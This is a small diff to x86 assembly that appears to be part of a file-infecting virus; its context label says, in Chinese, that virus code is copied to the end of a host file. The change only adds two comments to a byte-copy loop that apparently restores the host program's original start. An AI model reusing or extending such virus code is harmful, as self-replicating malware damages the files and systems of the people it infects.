@@ -189,7 +189,9 @@ EndVirusStart:;被拷贝到尾部的病毒代码开始部分
 
 _loop2:
 mov al, [si]
+;[si] is the address of real_HdrVirusEnd
 mov byte [di], al
+;[di] is the address of real programm_begin
 inc si
 inc di
 dec cx
